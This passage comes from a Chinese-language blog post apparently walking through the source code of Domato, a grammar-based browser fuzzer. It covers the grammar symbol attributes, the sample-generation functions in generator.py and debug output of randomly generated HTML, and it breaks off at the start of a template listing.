ASCII 字符。例如<code>&lt;char code=97&gt;</code>对应于’a’。如果未指定，则生成随机字符。支持“min”和“max”属性。</li><li><code>&lt;hex&gt;</code> - 生成一个随机的十六进制数字。</li><li><code>&lt;int&gt;</code>, <code>&lt;int 8&gt;</code>, <code>&lt;uint8&gt;</code>, <code>&lt;int16&gt;</code>, <code>&lt;uint16&gt;</code>, <code>&lt;int32&gt;</code>, <code>&lt;uint32&gt;</code>, <code>&lt;int64&gt;</code>, <code>&lt;uint64&gt;</code>- 可用于生成随机整数。支持 ‘min’ 和 ‘max’ 属性，可用于限制将生成的整数范围。支持 ‘b’ 和 ‘be’ 属性，这使得输出二进制文件为小/大端格式，而不是文本输出。</li><li><code>&lt;float&gt;</code>, <code>&lt;double&gt;</code>- 生成一个随机浮点数。支持 ‘min’ 和 ‘max’ 属性（如果未指定，则为 0 和 1）。支持使输出二进制的“b”属性。</li><li><code>&lt;string&gt;</code>- 生成一个随机字符串。支持控制生成的最小和最大字符代码的“min”和“max”属性以及控制字符串长度的“minlength”和“maxlength”属性。</li><li><code>&lt;htmlsafestring&gt;</code>- 与<code>&lt;string&gt;</code>除了 HTML 元字符将被转义外相同，从而可以安全地将字符串作为 HTML 文本或属性值的一部分嵌入。</li><li><code>&lt;lines&gt;</code>- 输出给定数量（通过 ‘count’ 属性）的代码行。例如，请参阅有关生成编程语言代码的部分。</li><li><code>&lt;import&gt;</code> - 从另一个语法导入符号，请参阅包含外部语法的部分了解详细信息。</li><li><code>&lt;call&gt;</code>- 调用与函数属性相对应的用户定义函数。有关详细信息，请参阅有关在语法中包含 Python 代码的部分。</li></ul><h5 id="符号属性"><a href="#符号属性" class="headerlink" title="符号属性"></a>符号属性</h5><p>支持以下属性：</p><ul><li><code>root</code> - 将符号标记为语法的根符号。唯一支持的值为“true”。调用 GenerateSymbol() 时，如果未指定参数，将生成根符号。</li><li><code>nonrecursive</code> - 向生成器提示此规则不包含递归循环并用于防止无限递归。唯一支持的值为“true”。</li><li><code>new</code> - 在生成编程语言时用于表示此处创建了一个新变量，而不是像往常一样扩展符号。唯一支持的值为“true”。</li><li><code>from</code>, 符号 - 从其他语法导入符号时使用，请参阅“包括外部语法”部分。</li><li><code>count</code> - 用于行符号以指定要创建的行数。</li><li><code>id</code> - 用于标记多个符号应该共享相同的值。例如，在规则中，<code>‘doSomething(&lt;int id=1&gt;, &lt;int id=1&gt;)’</code>两个整数最终将具有相同的值。实际上只有第一个实例被扩展，第二个只是从第一个实例复制而来。</li><li><code>min, max</code> - 用于生成数字类型以指定最小值和最大值。也用于限制字符串中生成的字符集。</li><li><code>b, be</code> - 在数字类型中用于指定二进制小端 (‘b’) 或大端 (‘be’) 输出。</li><li><code>code</code> - 用于字符符号以指定要由其代码输出的确切字符。</li><li><code>minlength, maxlength</code> - 在生成字符串时用于指定最小和最大长度。</li><li><code>up</code> - 在十六进制符号中用于指定大写输出（小写是默认值）。</li><li><code>function</code> - 在<code>&lt;call&gt;</code>符号中使用，有关更多信息，请参阅“包括 Python 代码”部分。</li><li><code>beforeoutput</code> - 用于调用用户指定的函数，请参阅“包括 Python”。</li></ul><p>待改进的点</p><ol><li>最好结合目前主流的基于覆盖引导的模糊测试技术来增加发现crash的概率（作者在他的博客上po上了相关的尝试，但是效果不太理想），作者的思路是目前比较主流的基于覆盖引导的fuzzer常用的思路，没有发现新的崩溃可能是由于对变异策略等方向的实现出现了问题（也就是作者结合的可能不够好，这块一定是一个可搞的点，不过有个问题就是很多的基于覆盖引导的fuzzer在开始fuzz前会给fuzzer提供语料库，并对其进行精简，而domato生成的样本又比较大，如何平衡这种代码覆盖率和效率的问题是非常关键的一点）。</li><li>目前官方工具里面没有对主流浏览器进行自动化测试的工具（ps：虽然这个功能比较简单）</li></ol><h2 id="源码分析"><a href="#源码分析" class="headerlink" title="源码分析"></a>源码分析</h2><h3 id="generator-py-1"><a href="#generator-py-1" class="headerlink" title="generator.py"></a>generator.py</h3><p>首先判断参数，决定生成单个文件还是多个文件，都是调用generate_samples来生成文件，区别在于生成多少个。生成文件的命名格式，如果是多个，则按照fuzz-xxxxx.html递增。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> args.file:</span><br><span class="line">    generate_samples(template, [args.file])                 <span class="comment"># 可见generate_samples函数为生成样本的核心函数</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">elif</span> args.output_dir:</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> args.no_of_files:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Please use switch -n to specify the number of files&quot;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        ...</span><br><span class="line">        outfiles = []</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(nsamples):</span><br><span class="line">            outfiles.append(os.path.join(out_dir, <span class="string">&#x27;fuzz-&#x27;</span> + <span class="built_in">str</span>(i).zfill(<span class="number">5</span>) + <span class="string">&#x27;.html&#x27;</span>))</span><br><span class="line">        generate_samples(template, outfiles)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    parser.print_help()</span><br></pre></td></tr></table></figure><p>在generate_samples，调用了Grammar.py的库，解析了三个txt文件作为文法，并把css的文法namespace导入到html和js的文法namespace中。这里的<code>parse_from_file</code>函数后续要跟入Grammar.py去查看实现。最后调用了generate_new_sample去完成实际的html文件生成的操作。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">generate_samples</span>(<span class="params">template, outfiles</span>):</span></span><br><span class="line">    <span class="string">&quot;&quot;&quot;该函数主要为了生成样本和写文件</span></span><br><span class="line"><span class="string">    Args:</span></span><br><span class="line"><span class="string">      template: 生成样本的模板，传入generate_new_sample函数中使用。</span></span><br><span class="line"><span class="string">      outfiles: 输出文件名的列表</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">    grammar_dir = os.path.join(os.path.dirname(__file__), <span class="string">&#x27;rules&#x27;</span>)</span><br><span class="line">    htmlgrammar = Grammar()</span><br><span class="line"></span><br><span class="line">    err = htmlgrammar.parse_from_file(os.path.join(grammar_dir, <span class="string">&#x27;html.txt&#x27;</span>))</span><br><span class="line">    <span class="comment"># CheckGrammar(htmlgrammar)</span></span><br><span class="line">    cssgrammar = Grammar()</span><br><span class="line">    err = cssgrammar.parse_from_file(os.path.join(grammar_dir, <span class="string">&#x27;css.txt&#x27;</span>))</span><br><span class="line">    <span class="comment"># CheckGrammar(cssgrammar)</span></span><br><span class="line">    jsgrammar = Grammar()</span><br><span class="line">    err = jsgrammar.parse_from_file(os.path.join(grammar_dir, <span class="string">&#x27;js.txt&#x27;</span>))</span><br><span class="line">    <span class="comment"># CheckGrammar(jsgrammar)</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># JS and HTML grammar need access to CSS grammar.</span></span><br><span class="line">    <span class="comment"># Add it as import</span></span><br><span class="line">    htmlgrammar.add_import(<span class="string">&#x27;cssgrammar&#x27;</span>, cssgrammar)</span><br><span class="line">    jsgrammar.add_import(<span class="string">&#x27;cssgrammar&#x27;</span>, cssgrammar)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> outfile <span class="keyword">in</span> outfiles:</span><br><span class="line">        result = generate_new_sample(template, htmlgrammar, cssgrammar, jsgrammar)</span><br><span class="line">        <span class="comment">#writefile</span></span><br></pre></td></tr></table></figure><p>这里需要注意的是<code>generate_symbol</code>函数，还有<code>_generate_code</code>函数，<code>_generate_code</code>在generate_function_body函数中，用来生成js代码。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># generate_symbol 函数</span></span><br><span class="line"><span class="comment"># 先生成了html和css的结果，定义了template文件，方便将随机化生成的html，css，js放入特定的模板中进行排布，</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">generate_new_sample</span>(<span class="params">template, htmlgrammar, cssgrammar, jsgrammar</span>):</span></span><br><span class="line">    <span class="string">&quot;&quot;&quot;从字符串中解析grammar规则</span></span><br><span class="line"><span class="string">    Args:</span></span><br><span class="line"><span class="string">      template: 是一个html文件，利用随机生成的html,js,css替换模板文件中的uzzer&gt;，&lt;jsfuzzer&gt;，&lt;cssfuzzer&gt;</span></span><br><span class="line"><span class="string">      htmlgrammar: grammar生成的html代码</span></span><br><span class="line"><span class="string">      cssgrammar: grammar生成的css代码</span></span><br><span class="line"><span class="string">      jsgrammar: grammar生成的js代码</span></span><br><span class="line"><span class="string">    Returns:</span></span><br><span class="line"><span class="string">     最终的样本代码，html格式</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">    result = template</span><br><span class="line"></span><br><span class="line">    css = cssgrammar.generate_symbol(<span class="string">&#x27;rules&#x27;</span>)</span><br><span class="line">    html = htmlgrammar.generate_symbol(<span class="string">&#x27;bodyelements&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    htmlctx = &#123;</span><br><span class="line">        <span class="string">&#x27;htmlvars&#x27;</span>: [],</span><br><span class="line">        <span class="string">&#x27;htmlvarctr&#x27;</span>: <span class="number">0</span>,</span><br><span class="line">        <span class="string">&#x27;svgvarctr&#x27;</span>: <span class="number">0</span>,</span><br><span class="line">        <span class="string">&#x27;htmlvargen&#x27;</span>: <span class="string">&#x27;&#x27;</span></span><br><span class="line">    &#125;</span><br><span class="line">    html = re.sub(</span><br><span class="line">        <span class="string">r&#x27;&lt;[a-zA-Z0-9_-]+ &#x27;</span>,                              <span class="comment"># 从html_tags.py与svg_tags.py文件去匹配match与tag的对应关系</span></span><br><span class="line">        <span class="keyword">lambda</span> match: add_html_ids(match, htmlctx),       <span class="comment"># lambda 匿名函数表达式，可以直接作为函数使用，也更方便了函数的嵌套</span></span><br><span class="line">        html</span><br><span class="line">    )</span><br><span class="line"> </span><br><span class="line">    generate_html_elements(htmlctx, _N_ADDITIONAL_HTMLVARS)<span class="comment"># 默认为htmlctx加了5个随机的_HTML_TYPES，但没改变变量html</span></span><br><span class="line"></span><br><span class="line">    result = result.replace(<span class="string">&#x27;&lt;cssfuzzer&gt;&#x27;</span>, css)</span><br><span class="line">    result = result.replace(<span class="string">&#x27;&lt;htmlfuzzer&gt;&#x27;</span>, html)</span><br><span class="line"></span><br><span class="line">    handlers = <span class="literal">False</span></span><br><span class="line">    <span class="keyword">while</span> <span class="string">&#x27;&lt;jsfuzzer&gt;&#x27;</span> <span class="keyword">in</span> result:</span><br><span class="line">        numlines = _N_MAIN_LINES</span><br><span class="line">        <span class="keyword">if</span> handlers:</span><br><span class="line">            numlines = _N_EVENTHANDLER_LINES</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            handlers = <span class="literal">True</span></span><br><span class="line">        result = result.replace(</span><br><span class="line">            <span class="string">&#x27;&lt;jsfuzzer&gt;&#x27;</span>,</span><br><span class="line">            generate_function_body(jsgrammar, htmlctx, numlines),<span class="comment"># 通过生成js代码并替换result来实现最后的替换。</span></span><br><span class="line">            <span class="number">1</span></span><br><span class="line">        )</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> result</span><br></pre></td></tr></table></figure><p>add_html_ids函数实现，该函数会判断随机生成的标签属于html还是svg，之后会对html_ctx赋值。目的是为了统计之前生成的html标签和svg标签计数。并将id加到标签中。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add_html_ids</span>(<span class="params">matchobj, ctx</span>):</span></span><br><span class="line">    tagname = matchobj.group(<span class="number">0</span>)[<span class="number">1</span>:-<span class="number">1</span>]</span><br><span class="line">    <span class="keyword">if</span> tagname <span class="keyword">in</span> _HTML_TYPES:</span><br><span class="line">        ctx[<span class="string">&#x27;htmlvarctr&#x27;</span>] += <span class="number">1</span></span><br><span class="line">        varname = <span class="string">&#x27;htmlvar%05d&#x27;</span> % ctx[<span class="string">&#x27;htmlvarctr&#x27;</span>]</span><br><span class="line">        ctx[<span class="string">&#x27;htmlvars&#x27;</span>].append(&#123;<span class="string">&#x27;name&#x27;</span>: varname, <span class="string">&#x27;type&#x27;</span>: _HTML_TYPES[tagname]&#125;)</span><br><span class="line">        ctx[<span class="string">&#x27;htmlvargen&#x27;</span>] += <span class="string">&#x27;/* newvar&#123;&#x27;</span> + varname + <span class="string">&#x27;:&#x27;</span> + _HTML_TYPES[</span><br><span class="line">            tagname] + <span class="string">&#x27;&#125; */ var &#x27;</span> + varname + <span class="string">&#x27; = document.getElementById(\&quot;&#x27;</span> + varname + <span class="string">&#x27;\&quot;); //&#x27;</span> + _HTML_TYPES[</span><br><span class="line">                                 tagname] + <span class="string">&#x27;\n&#x27;</span></span><br><span class="line">        <span class="keyword">return</span> matchobj.group(<span class="number">0</span>) + <span class="string">&#x27;id=\&quot;&#x27;</span> + varname + <span class="string">&#x27;\&quot; &#x27;</span></span><br><span class="line">    <span class="keyword">elif</span> tagname <span class="keyword">in</span> _SVG_TYPES:</span><br><span class="line">        ctx[<span class="string">&#x27;svgvarctr&#x27;</span>] += <span class="number">1</span></span><br><span class="line">        varname = <span class="string">&#x27;svgvar%05d&#x27;</span> % ctx[<span class="string">&#x27;svgvarctr&#x27;</span>]</span><br><span class="line">        ctx[<span class="string">&#x27;htmlvars&#x27;</span>].append(&#123;<span class="string">&#x27;name&#x27;</span>: varname, <span class="string">&#x27;type&#x27;</span>: _SVG_TYPES[tagname]&#125;)</span><br><span class="line">        ctx[<span class="string">&#x27;htmlvargen&#x27;</span>] += <span class="string">&#x27;/* newvar&#123;&#x27;</span> + varname + <span class="string">&#x27;:&#x27;</span> + _SVG_TYPES[</span><br><span class="line">            tagname] + <span class="string">&#x27;&#125; */ var &#x27;</span> + varname + <span class="string">&#x27; = document.getElementById(\&quot;&#x27;</span> + varname + <span class="string">&#x27;\&quot;); //&#x27;</span> + _SVG_TYPES[</span><br><span class="line">                                 tagname] + <span class="string">&#x27;\n&#x27;</span></span><br><span class="line">        <span class="keyword">return</span> matchobj.group(<span class="number">0</span>) + <span class="string">&#x27;id=\&quot;&#x27;</span> + varname + <span class="string">&#x27;\&quot; &#x27;</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> matchobj.group(<span class="number">0</span>)</span><br></pre></td></tr></table></figure><p>generate_html_elements这个函数比较简单，添加了<code>n</code>行html元素到html_ctx中，默认为5，可以通过修改代码进行更改</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">generate_html_elements</span>(<span class="params">ctx, n</span>):</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(n):</span><br><span class="line">        tag = random.choice(<span class="built_in">list</span>(_HTML_TYPES))</span><br><span class="line">        tagtype = _HTML_TYPES[tag]</span><br><span class="line">        ctx[<span class="string">&#x27;htmlvarctr&#x27;</span>] += <span class="number">1</span></span><br><span class="line">        varname = <span class="string">&#x27;htmlvar%05d&#x27;</span> % ctx[<span class="string">&#x27;htmlvarctr&#x27;</span>]</span><br><span class="line">        ctx[<span class="string">&#x27;htmlvars&#x27;</span>].append(&#123;<span class="string">&#x27;name&#x27;</span>: varname, <span class="string">&#x27;type&#x27;</span>: tagtype&#125;)</span><br><span class="line">        ctx[</span><br><span class="line">            <span class="string">&#x27;htmlvargen&#x27;</span>] += <span class="string">&#x27;/* newvar&#123;&#x27;</span> + varname + <span class="string">&#x27;:&#x27;</span> + tagtype + <span class="string">&#x27;&#125; */ var &#x27;</span> + varname + <span class="string">&#x27; = document.createElement(\&quot;&#x27;</span> + tag + <span class="string">&#x27;\&quot;); //&#x27;</span> + tagtype + <span class="string">&#x27;\n&#x27;</span></span><br></pre></td></tr></table></figure><p>generate_function_body这个函数用来生成js代码，前面是一段模板式的代码，后面调用_generate_code生成随机的js代码，可以指定行数。这个函数上面也说过，最关键的在于<code>_generate_code</code>函数的逻辑。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">generate_function_body</span>(<span class="params">jsgrammar, htmlctx, num_lines</span>):</span></span><br><span class="line">    js = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    js += <span class="string">&#x27;var fuzzervars = &#123;&#125;;\n\n&#x27;</span></span><br><span class="line">    js += <span class="string">&quot;SetVariable(fuzzervars, window, &#x27;Window&#x27;);\nSetVariable(fuzzervars, document, &#x27;Document&#x27;);\nSetVariable(fuzzervars, document.body.firstChild, &#x27;Element&#x27;);\n\n&quot;</span></span><br><span class="line">    js += <span class="string">&#x27;//beginjs\n&#x27;</span></span><br><span class="line">    js += htmlctx[<span class="string">&#x27;htmlvargen&#x27;</span>]</span><br><span class="line">    js += jsgrammar._generate_code(num_lines, htmlctx[<span class="string">&#x27;htmlvars&#x27;</span>])</span><br><span class="line">    js += <span class="string">&#x27;\n//endjs\n&#x27;</span></span><br><span class="line">    js += <span class="string">&#x27;var fuzzervars = &#123;&#125;;\nfreememory()\n&#x27;</span></span><br><span class="line">    <span class="keyword">return</span> js</span><br></pre></td></tr></table></figure><p>generate_new_sample函数调试跟踪。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"># html变量某次结果</span><br><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">longdesc</span>=<span class="string">&quot;^r&#123;=g$3-<span class="symbol">&amp;#x27;</span>f<span class="symbol">&amp;gt;</span>&#125;N7&quot;</span> <span class="attr">is</span>=<span class="string">&quot;x-rect&quot;</span> <span class="attr">srcdoc</span>=<span class="string">&quot;!m!VM)u&quot;</span> <span class="attr">frameborder</span>=<span class="string">&quot;1&quot;</span> <span class="attr">srcdoc</span>=<span class="string">&quot;gPd80b6D0g&quot;</span> <span class="attr">style</span>=<span class="string">&quot;scroll-snap-points-y: inherit; mso-font-kerning: 6pt; border-bottom-left-radius: -1px; border-right-style: hidden; overflow-y: auto&quot;</span> <span class="attr">download</span>=<span class="string">&quot;^<span class="symbol">&amp;lt;</span>&quot;</span> <span class="attr">formnovalidate</span>=<span class="string">&quot;formnovalidate&quot;</span> <span class="attr">srcset</span>=<span class="string">&quot;AJZ=1<span class="symbol">&amp;#x27;</span>btpN<span class="symbol">&amp;#x27;</span>=&quot;</span> <span class="attr">formmethod</span>=<span class="string">&quot;get&quot;</span>&gt;</span>t;3qg<span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">canvas</span> <span class="attr">dir</span>=<span class="string">&quot;rtl&quot;</span> <span class="attr">style</span>=<span class="string">&quot;clip-path: url(#htmlvar00006); grid-template-areas: &#x27;a&#x27;; overflow-wrap: break-word; width: 1pt; tab-size: 0&quot;</span> <span class="attr">style</span>=<span class="string">&quot;stroke-dashoffset: 30px; word-spacing: 0ex; stroke-linecap: round; stroke-opacity: 1; column-break-before: always&quot;</span> <span class="attr">style</span>=<span class="string">&quot;-webkit-margin-collapse: collapse separate; font-feature-settings: &#x27;liga&#x27; 1; hyphens: auto; border-radius: -1 0 0px 42; border-bottom-right-radius: 0px&quot;</span> <span class="attr">name</span>=<span class="string">&quot;\uJItGlTNA&quot;</span> <span class="attr">seed</span>=<span class="string">&quot;0&quot;</span> <span class="attr">behavior</span>=<span class="string">&quot;scroll&quot;</span> <span class="attr">autoload</span>=<span class="string">&quot;autoload&quot;</span> <span class="attr">face</span>=<span class="string">&quot;Arial,helvetica&quot;</span> <span class="attr">marginwidth</span>=<span class="string">&quot;0&quot;</span>&gt;</span>|Z l<span class="tag">&lt;/<span class="name">canvas</span>&gt;</span></span><br><span class="line">...</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># add_html_ids处理后后htmlctx的结果</span><br><span class="line">   &#123;&#x27;htmlvars&#x27;: [&#123;&#x27;name&#x27;: &#x27;htmlvar00001&#x27;, &#x27;type&#x27;: &#x27;HTMLIFrameElement&#x27;&#125;, &#123;&#x27;name&#x27;: &#x27;htmlvar00002&#x27;, &#x27;type&#x27;: &#x27;HTMLCanvasElement&#x27;&#125;...], </span><br><span class="line">   &#x27;htmlvarctr&#x27;: 20, </span><br><span class="line">   &#x27;svgvarctr&#x27;: 0, </span><br><span class="line">   &#x27;htmlvargen&#x27;: &#x27;/* newvar&#123;htmlvar00001:HTMLIFrameElement&#125; */ var htmlvar00001 = document.getElementById(&quot;htmlvar00001&quot;); //HTMLIFrameElement\n/* newvar&#123;htmlvar00002:HTMLCanvasElement&#125; */ var htmlvar00002 = document.getElementById(&quot;htmlvar00002&quot;); //HTMLCanvasElement\n ...&#x27;&#125;</span><br><span class="line"></span><br><span class="line"># htm的结果，在标签后面加上了id</span><br><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">id</span>=<span class="string">&quot;htmlvar00001&quot;</span> <span class="attr">longdesc</span>=<span class="string">&quot;^r&#123;=g$3-<span class="symbol">&amp;#x27;</span>f<span class="symbol">&amp;gt;</span>&#125;N7&quot;</span> <span class="attr">is</span>=<span class="string">&quot;x-rect&quot;</span> <span class="attr">srcdoc</span>=<span class="string">&quot;!m!VM)u&quot;</span> <span class="attr">frameborder</span>=<span class="string">&quot;1&quot;</span> <span class="attr">srcdoc</span>=<span class="string">&quot;gPd80b6D0g&quot;</span> <span class="attr">style</span>=<span class="string">&quot;scroll-snap-points-y: inherit; mso-font-kerning: 6pt; border-bottom-left-radius: -1px; border-right-style: hidden; overflow-y: auto&quot;</span> <span class="attr">download</span>=<span class="string">&quot;^<span class="symbol">&amp;lt;</span>&quot;</span> <span class="attr">formnovalidate</span>=<span class="string">&quot;formnovalidate&quot;</span> <span class="attr">srcset</span>=<span class="string">&quot;AJZ=1<span class="symbol">&amp;#x27;</span>btpN<span class="symbol">&amp;#x27;</span>=&quot;</span> <span class="attr">formmethod</span>=<span class="string">&quot;get&quot;</span>&gt;</span>t;3qg<span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">canvas</span> <span class="attr">id</span>=<span class="string">&quot;htmlvar00002&quot;</span> <span class="attr">dir</span>=<span class="string">&quot;rtl&quot;</span> <span class="attr">style</span>=<span class="string">&quot;clip-path: url(#htmlvar00006); grid-template-areas: &#x27;a&#x27;; overflow-wrap: break-word; width: 1pt; tab-size: 0&quot;</span> <span class="attr">style</span>=<span class="string">&quot;stroke-dashoffset: 30px; word-spacing: 0ex; stroke-linecap: round; stroke-opacity: 1; column-break-before: always&quot;</span> <span class="attr">style</span>=<span class="string">&quot;-webkit-margin-collapse: collapse separate; font-feature-settings: &#x27;liga&#x27; 1; hyphens: auto; border-radius: -1 0 0px 42; border-bottom-right-radius: 0px&quot;</span> <span class="attr">name</span>=<span class="string">&quot;\uJItGlTNA&quot;</span> <span class="attr">seed</span>=<span class="string">&quot;0&quot;</span> <span class="attr">behavior</span>=<span class="string">&quot;scroll&quot;</span> <span class="attr">autoload</span>=<span class="string">&quot;autoload&quot;</span> <span class="attr">face</span>=<span class="string">&quot;Arial,helvetica&quot;</span> <span class="attr">marginwidth</span>=<span class="string">&quot;0&quot;</span>&gt;</span>|Z l<span class="tag">&lt;/<span class="name">canvas</span>&gt;</span></span><br><span class="line">...</span><br><span class="line"></span><br><span class="line"># generate_html_elements处理后htmlctx的结果：htmlvars和htmlvargen后面都又增加了5个元素。但是该函数没有更新html变量。</span><br><span class="line">   &#123;&#x27;htmlvars&#x27;: [&#123;&#x27;name&#x27;: &#x27;htmlvar00001&#x27;, &#x27;type&#x27;: &#x27;HTMLIFrameElement&#x27;&#125;, &#123;&#x27;name&#x27;: &#x27;htmlvar00002&#x27;, &#x27;type&#x27;: &#x27;HTMLCanvasElement&#x27;&#125;...], </span><br><span class="line">   &#x27;htmlvarctr&#x27;: 25, </span><br><span class="line">   &#x27;svgvarctr&#x27;: 0, </span><br><span class="line">   &#x27;htmlvargen&#x27;: &#x27;/* newvar&#123;htmlvar00001:HTMLIFrameElement&#125; */ var htmlvar00001 = document.getElementById(&quot;htmlvar00001&quot;); //HTMLIFrameElement\n/* newvar&#123;htmlvar00002:HTMLCanvasElement&#125; */ var htmlvar00002 = document.getElementById(&quot;htmlvar00002&quot;); //HTMLCanvasElement\n ...&#x27;&#125;</span><br></pre></td></tr></table></figure><p>经过上面的过程，可以将我们给定的模板进行替换，模板大致如下</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- saved from url=(0014)about:internet 